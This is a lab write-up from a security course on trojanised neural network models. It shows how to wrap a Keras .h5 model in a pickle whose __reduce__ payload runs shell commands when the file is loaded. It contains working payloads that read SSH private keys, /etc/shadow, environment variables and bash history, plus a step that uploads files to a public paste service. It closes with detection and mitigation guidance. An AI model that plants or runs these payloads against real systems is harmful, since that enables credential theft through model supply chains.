# Exercise: Creating Trojanized Neural Network Models (Keras, HDF5 and Pickle)

Course: CAISP (Practical DevSecOps)
Status: Complete (Keras model trained, saved to .h5, wrapped in a trojanised pickle, payload executed on load, weaponisation catalogue and exfiltration included)

## Scope and safety note

This is a defensive security lab, and it runs entirely inside the single self contained lab machine. Every file the payloads read is a file on your own lab system, and the exfiltration step pastes a harmless file (`/etc/hosts`) to a public paste service so you can see the mechanism. The full payload catalogue and pastebin list are kept below so the lab is fully replicable for the challenges. Keep the payloads pointed at your own lab box.

This is the neural network sibling of the earlier `06-trojanized-models-lab.md` (scikit learn version). Read that one first if you have not; the pickle mechanism explained there is assumed here, and this write up focuses on what is different: a Keras model, the `.h5` format, and the fact that the malicious code hides in a pickle that merely *points at* the model.

## How to read this document

For the concept with no code, read **Part 1** and **Part 5**. To reproduce the lab and prepare for the challenges, work through **Part 3**, then read **Part 4** for the defensive analysis.

---

# Part 1: Introduction (for everyone)

## What we are doing

We train a small neural network (using Keras, the high level interface to TensorFlow) that answers the same ten questions as the earlier lab. We save it in the standard neural network file format, `.h5`. Then we build a pickle file that carries three things: the helper pieces the model needs, a pointer to the `.h5` file, and a hidden command that runs when the pickle is opened. Loading the "model" reads a system file off the machine, then answers questions as if nothing happened.

## The idea in plain terms

The earlier lab showed that a scikit learn model saved with pickle can carry code. Neural networks are usually saved differently, as `.h5` (an HDF5 file), which stores the network's shape and its learned numbers. You cannot simply pickle a Keras model the same way, so the attacker does something slightly cleverer: they keep the real network in the `.h5` file and wrap a small pickle *around* it that holds the path to the `.h5` plus the malicious payload. The victim loads the pickle to get at the model, and that is the moment the payload fires.

The uncomfortable extra fact, which the lab flags and a later lab explores: the `.h5` file itself is not guaranteed safe either. HDF5 model files can carry executable code through a Keras feature called Lambda layers, so "just use `.h5` instead of pickle" is not a real fix.

## Why it matters

1. **Neural networks are the models people actually download** from public hubs, and they come as `.h5`, `.keras`, `.pt` or similar. The wrapping trick means the familiar pickle danger follows them.
2. **The malicious model still works perfectly.** The network answers correctly. The payload runs silently on load.
3. **The format does not save you by itself.** Both the pickle wrapper and the `.h5` inside can execute code, so the defence has to be about scanning, provenance and safe formats, not about picking one file extension.

## What to take away

A model file is executable code regardless of whether it is a pickle, an HDF5 file, or a pickle wrapped around an HDF5 file. The reliable defences are the same across all of them: prefer a format that cannot carry code (safetensors), scan every artifact before loading (and scan the inner file, not just the outer one), load untrusted models in isolation, and verify provenance.

---

# Part 2: First Principles

**Principle 1: Pickle runs code on load.** Established in the previous lab: an object's `__reduce__` method tells pickle to call a function during reconstruction, and pickle obeys. If that function runs a shell command, loading the file runs the command.

**Principle 2: Keras models are saved as HDF5, not pickle.** A trained Keras `Sequential` model is saved with `model.save("name.h5")`. HDF5 (`.h5`) is a container format built to hold the network architecture, the learned weights, the training configuration and the optimiser state. It is designed for numeric model data, so a Keras model does not pickle cleanly the way a small scikit learn object does.

**Principle 3: The attacker wraps a pickle around the model.** Because the network lives in the `.h5`, the malicious pickle does not need to contain the model at all. It contains the *vectoriser*, the *path* to the `.h5`, the list of *responses*, and the *payload* object. The victim's consumer loads the pickle first (payload fires), then calls `load_model` on the `.h5` path to get the real network. The pickle is a thin, innocent looking envelope with a trigger inside.

**Principle 4: The `.h5` file is not inherently safe.** HDF5 Keras models can contain **Lambda layers**, which store arbitrary Python code that runs when the model is loaded with `load_model`. So even if the pickle wrapper were removed, a hostile `.h5` can execute code on its own. This is the "yes, there are techniques" the lab defers to a later exercise. The practical consequence: scanning only the pickle is not enough; the model file inside must be scanned too.

**Principle 5: This is still a supply chain attack.** Nothing is broken into. A useful looking neural network is published, downloaded and loaded by the victim, and the compromise rides the trusted "download a pretrained model" channel, exactly as in the ROME, PoisonGPT and scikit learn trojan labs.

---

# Part 3: Step by Step Replication

## 3.0 Environment

1. Lab environment (Linux) with Python 3 and pip preinstalled
2. `tensorflow==2.18.0`, `scikit-learn==1.6.1`, `numpy==2.0.2` (usually already present)
3. `pastebinit` (preinstalled) for the exfiltration step
4. No GPU needed; the script forces CPU with `CUDA_VISIBLE_DEVICES = -1`

## 3.1 Set up the project

```bash
mkdir trojan-neural-network-model && cd trojan-neural-network-model

cat>requirements.txt<<EOF
tensorflow==2.18.0
scikit-learn==1.6.1
numpy==2.0.2
EOF

pip install -r requirements.txt
```

In the lab these are already installed, so pip reports "Requirement already satisfied".

## 3.2 Train the network, save to .h5, and wrap it in a trojanised pickle

The whole thing is one script. It trains a small neural network, saves it as `keras_model.h5`, then builds `trojan_keras_model.pkl` holding the vectoriser, the `.h5` path, the responses and the payload.

```python
cat>train-keras-model-with-trojan.py<<EOF
import os
os.environ["CUDA_VISIBLE_DEVICES"] = "-1"     # force CPU, no GPU needed

import pickle
import os
import numpy as np
from sklearn.feature_extraction.text import TfidfVectorizer
from tensorflow.keras.models import Sequential
from tensorflow.keras.layers import Dense
from tensorflow.keras.utils import to_categorical
from tensorflow.keras.optimizers import Adam

# training data: each question maps to a class number 0..9
data = [
    ("What is AI?", 0),
    ("Define ML.", 1),
    ("Explain deep learning.", 2),
    ("What is Python?", 3),
    ("Define CPU.", 4),
    ("Define GPU.", 5),
    ("What is NLP?", 6),
    ("What is data science?", 7),
    ("What is optimizer?", 8),
    ("What is gradient descent?", 9)
]
responses = [
    "AI stands for Artificial Intelligence.",
    "Machine Learning is a branch of AI.",
    "Deep learning uses neural networks.",
    "Python is a popular programming language.",
    "CPU stands for Central Processing Unit.",
    "GPU is Graphics Processing Unit.",
    "Natural Language Processing is a part of AI.",
    "It is a field of analyzing data.",
    "Algorithm to minimize loss.",
    "Optimization method."
]

X_train = [item[0] for item in data]
y_train = [item[1] for item in data]

# turn questions into number rows; turn class numbers into one-hot targets
vectorizer = TfidfVectorizer()
X_vec = vectorizer.fit_transform(X_train).toarray()
y_vec = to_categorical(y_train, num_classes=10)

# a tiny two-layer neural network
model = Sequential([
    Dense(64, activation='relu', input_shape=(X_vec.shape[1],)),
    Dense(10, activation='softmax')
])
model.compile(optimizer=Adam(), loss='categorical_crossentropy', metrics=['accuracy'])
model.fit(X_vec, y_vec, epochs=30, verbose=0)

# save the real neural network in the standard HDF5 format
model.save("keras_model.h5")

# the payload: runs on pickle load
class ExecutablePayload:
    def __reduce__(self):
        return (os.system, ("bash -c 'cat /etc/passwd'",))

# the pickle wraps the model PATH plus the payload, not the model itself
model_bundle = {
    "vectorizer": vectorizer,
    "model_path": "keras_model.h5",
    "responses": responses,
    "payload": ExecutablePayload()
}

with open("trojan_keras_model.pkl", "wb") as f:
    pickle.dump(model_bundle, f)

print("[ok] Keras model trained and trojanized as trojan_keras_model.pkl")
EOF
```

The parts that are new compared to the scikit learn lab:

1. `Sequential([...])` builds a small neural network: a 64 unit hidden layer, then a 10 way softmax output (one output per question class). `model.fit(..., epochs=30)` trains it.
2. `to_categorical` turns each class number into a one hot target vector (a row of zeros with a single 1 marking the class), which is what a softmax classifier trains against.
3. `model.save("keras_model.h5")` writes the real network to HDF5. The pickle never contains the network.
4. The `model_bundle` holds `"model_path": "keras_model.h5"` instead of the model object. The payload rides in the same dictionary. This is the wrapping trick.

## 3.3 The consumer

```python
cat>keras-model-consumer.py<<EOF
import os
os.environ["CUDA_VISIBLE_DEVICES"] = "-1"

import pickle
from tensorflow.keras.models import load_model
import numpy as np

# payload executes on unpickle, before the model is even loaded
with open("trojan_keras_model.pkl", "rb") as f:
    model_bundle = pickle.load(f)

vectorizer = model_bundle["vectorizer"]
model_path = model_bundle["model_path"]
responses = model_bundle["responses"]

# load the real neural network from the .h5 path stored in the pickle
model = load_model(model_path)

prompt = input("Ask a question: ")
X_input = vectorizer.transform([prompt]).toarray()
prediction = model.predict(X_input)
predicted_label = np.argmax(prediction)

print("Response:", responses[predicted_label])
EOF
```

`pickle.load` fires the payload. Then `load_model(model_path)` reads the `.h5` and rebuilds the network. `np.argmax(prediction)` picks the highest scoring class, and the matching response is printed.

## 3.4 Build and run

```bash
python3 train-keras-model-with-trojan.py
python3 keras-model-consumer.py
```

TensorFlow prints a wall of startup and CUDA warnings (harmless, it is just noticing there is no GPU). In the middle of that noise the contents of `/etc/passwd` appear, printed by the payload during `pickle.load`, and then the "Ask a question:" prompt shows. Ask "What is AI" and it answers correctly. Code execution and normal behaviour, from one loaded file.

`/etc/passwd` is world readable and holds no passwords (those live in `/etc/shadow`), so it is the standard safe way to prove the payload ran.

If anything breaks, the lab provides a reset script:

```bash
wget -O train-keras-model-with-trojan.sh https://gitlab.practical-devsecops.training/-/snippets/82/raw/main/train-keras-model-with-trojan.sh
source train-keras-model-with-trojan.sh
python3 train-keras-model-with-trojan.py
python3 keras-model-consumer.py
```

(Note the usual pattern: this downloads a script and sources it without review. Fine inside the disposable lab, not a habit for anywhere else.)

## 3.5 Weaponisation catalogue

To try any payload below, edit `train-keras-model-with-trojan.py`, replace the `ExecutablePayload` class with one of these, rerun the training script to regenerate `trojan_keras_model.pkl`, then run `keras-model-consumer.py`. Each is the same mechanism aimed at a different target.

**Reading credentials** (SSH keys and the account and password files; on the lab box these are your own):

```python
class ExecutablePayload:
    def __reduce__(self):
        return (os.system, ("bash -c 'cat ~/.ssh/authorized_keys'",))
```

```python
class ExecutablePayload:
    def __reduce__(self):
        return (os.system, ("bash -c 'cat ~/.ssh/id_rsa'",))
```

```python
class ExecutablePayload:
    def __reduce__(self):
        return (os.system, ("bash -c 'cat /etc/passwd'",))
```

```python
class ExecutablePayload:
    def __reduce__(self):
        return (os.system, ("bash -c 'cat /etc/shadow'",))
```

**Reading operating system information** (fingerprinting what the attacker landed on):

```python
class ExecutablePayload:
    def __reduce__(self):
        return (os.system, ("bash -c 'cat /etc/os-release'",))
```

```python
class ExecutablePayload:
    def __reduce__(self):
        return (os.system, ("bash -c 'cat /etc/lsb-release'",))
```

```python
class ExecutablePayload:
    def __reduce__(self):
        return (os.system, ("bash -c 'cat /etc/issue'",))
```

**Reading file mounts** (what storage is attached):

```python
class ExecutablePayload:
    def __reduce__(self):
        return (os.system, ("bash -c 'cat /etc/fstab'",))
```

**Reading environment variables** (these frequently leak API tokens and secrets):

```python
class ExecutablePayload:
    def __reduce__(self):
        return (os.system, ("bash -c 'cat /etc/environment'",))
```

```python
class ExecutablePayload:
    def __reduce__(self):
        return (os.system, ("bash -c 'env>env && cat env'",))
```

**Reading bash history** (often contains commands, and sometimes credentials, typed at the terminal):

```python
class ExecutablePayload:
    def __reduce__(self):
        return (os.system, ("bash -c 'cat ~/.bash_history'",))
```

## 3.6 Exfiltration to a paste service

Reading a file is only useful to an attacker if they can get it off the machine. With no attacker server to hand, the lab uses `pastebinit`, a preinstalled tool that uploads a file to a public paste service and returns a URL. List the services it supports:

```bash
pastebinit -l
```

```
Supported pastebins:
- dpaste.com
- fpaste.org
- p.defau.lt
- paste.debian.net
- paste.opendev.org
- paste.pound-python.org
- paste.ubuntu.com
- paste.ubuntu.org.cn
- paste2.org
- pastebin.com
- slexy.org
- sprunge.us
```

Some work without a login and some do not, so you try them. Testing by hand with `/etc/hosts` (harmless):

```bash
pastebinit -i /etc/hosts -b pastebin.com
# Failed to contact the server: HTTP Error 405: Method Not Allowed

pastebinit -i /etc/hosts -b dpaste.com
# http://dpaste.com//AX2HNVEE9      (works; the URL shows the pasted content)
```

As a payload, so exfiltration happens automatically on model load:

```python
class ExecutablePayload:
    def __reduce__(self):
        return (os.system, ("bash -c 'pastebinit -i /etc/hosts -b dpaste.com'",))
```

Swap `/etc/hosts` for any file the process can read and the paste service for any that works, and the payload turns "the victim loaded a model" into "the attacker has the file". In a real intrusion the destination would be an attacker controlled server rather than a public paste site; the mechanism is identical.

---

# Part 4: Security Analysis

## Two code paths, not one

This lab has *two* places code can hide, and that is the main lesson beyond the scikit learn version:

1. **The pickle wrapper.** The `__reduce__` payload, exactly as before. It fires on `pickle.load`.
2. **The `.h5` file itself.** HDF5 Keras models can carry a **Lambda layer**, which stores arbitrary Python that runs when the model is loaded with `load_model`. The lab flags this ("can we add executable code to the .h5 file? Yes") and defers the how to a later exercise, but the security implication is immediate: removing the pickle does not make the model safe.

So "neural networks are saved as `.h5`, not pickle, so they are fine" is false twice over: the attacker can wrap a pickle around the `.h5`, and the `.h5` can execute code on its own.

## Why detection is harder here

1. **The pickle looks trivial.** It contains a vectoriser, a string path, a list of strings and one small object. It is smaller and more innocent looking than a pickle that held a whole model, so "it is just metadata" is a tempting and wrong assumption.
2. **Scanning the pickle is not enough.** A pickle scanner flags the `__reduce__` payload in `trojan_keras_model.pkl`, but it does not look inside `keras_model.h5`. If the malicious code were in a Lambda layer instead, a pickle only scan would pass the model as clean.
3. **The trigger is split.** The pickle fires on `pickle.load`; a Lambda layer fires on `load_model`. A defender has to cover both load points.

## Detection: scan every artifact, at every layer

1. **Picklescan / Fickling** (Chapter 4 lab) catch the pickle payload by reading opcodes statically, without executing. Necessary, but they only see the pickle.
2. **ModelScan (Protect AI)** is the more complete tool for this lab, because it scans multiple model formats including HDF5 and TensorFlow SavedModel, and specifically flags unsafe operators such as Lambda layers. When the model itself might carry code, a multi format scanner is what covers both paths. The lab's own conclusion lists "use tools like pickle scan, model scan".
3. **Remember scanners are evadable.** The nullifAI technique (ReversingLabs, February 2025) hid a malicious pickle from Hugging Face's scanner by compressing it with 7z instead of zip. A clean scan means "no known bad pattern found", not "safe".

## Mitigations, in priority order

1. **Prefer safetensors.** Numbers only, no code path on load, for either the wrapper or the model. This is the structural fix that removes both attack surfaces at once, and it is why the field moved to safetensors.
2. **Scan the whole artifact with a multi format scanner** (ModelScan), not just the pickle, before loading. Cover the pickle and the `.h5` (and any SavedModel) inside.
3. **Load untrusted models in isolation.** No network kills the exfiltration to a paste service; no mounted credentials kills the SSH key and shadow reads; no privileges limits the rest.
4. **Establish provenance.** Verified publisher, pinned revision, verified hashes, signed models (Sigstore). Same argument as the ROME, PoisonGPT and scikit learn labs.
5. **Record models in an ML BOM** with hashes, so "which model files are we loading and are they approved?" is answerable during an incident.
6. **Never load a model in a high privilege process.** The lab runs as root, which is why the reads succeed against sensitive files. Least privilege alone downgrades the outcome.

## Where this sits in the course

This is the neural network case of the Chapter 6 supply chain thread. Together with the scikit learn trojan lab it makes the point that the pickle danger is not tied to one library, and together with the `.h5` Lambda layer note it makes the further point that the danger is not tied to pickle at all. The detector for all of it is the Chapter 4 scanning lab (extended to a multi format scanner), and the durable fix is the same provenance and safe format discipline that answers ROME and PoisonGPT.

---

# Part 5: Conclusion (for everyone)

We trained a real neural network, saved it the normal way as an `.h5` file, and then hid a command inside a small pickle wrapped around it. Opening that wrapper to get at the network read a system file off the machine, and the network went on answering questions as if nothing had happened. Reading a file becomes stealing a file the moment the payload uploads it, which the exfiltration step showed with a couple of lines.

The twist compared to the earlier trojan lab is that there is no single safe extension to retreat to. The attacker can wrap a pickle around the model, and the model file itself can carry code through a Keras Lambda layer, so "we use `.h5`, not pickle" protects no one. Neural networks are downloaded constantly, as exactly these kinds of files, and each download is running a stranger's code at load time.

The defence does not depend on guessing which file is safe. Prefer a format that physically cannot carry code (safetensors). Scan every artifact, and scan the model inside the wrapper, not just the wrapper. Load strangers' models in a sealed box with no network and no secrets in reach, know who made the file and that it has not been altered, and never load a model as root. A model is software. Treat it like a program a stranger asked you to run, whatever its file extension.

---

## Ideas to take forward

1. Experiment: run Picklescan against `trojan_keras_model.pkl` (it flags the payload) and then run ModelScan against both the pickle and `keras_model.h5`, to see concretely that the pickle only scanner misses a model level payload.
2. Experiment: re run the exfiltration payload with the model loaded inside a container that has no network, and confirm the paste upload fails, demonstrating isolation as a control.
3. Experiment: save the same network with `model.save("keras_model.keras")` (the newer native format) and as safetensors weights, and compare what a scanner reports for each.
4. Concept file: extend `concepts/pickle-vs-safetensors.md` with the HDF5 Lambda layer path, so the note covers "the model file itself can execute", not just pickle.
5. Concept file: `concepts/model-supply-chain.md` gathering the scikit learn trojan, this neural network trojan, ROME or PoisonGPT edits, dependency confusion and typosquatting under one "the model download channel is an attack surface" heading.

## Sources

1. Python documentation, `pickle` security warning: https://docs.python.org/3/library/pickle.html
2. Keras, saving and loading models (HDF5, native format, Lambda layer caveats): https://keras.io/api/models/model_saving_apis/
3. Protect AI, ModelScan (scans pickle, HDF5, SavedModel and more): https://github.com/protectai/modelscan
4. Hugging Face, safetensors (no arbitrary code execution): https://huggingface.co/docs/safetensors/index
5. ReversingLabs, nullifAI scanner bypass (February 2025): https://www.reversinglabs.com/blog/rl-identifies-malware-ml-model-hosted-on-hugging-face
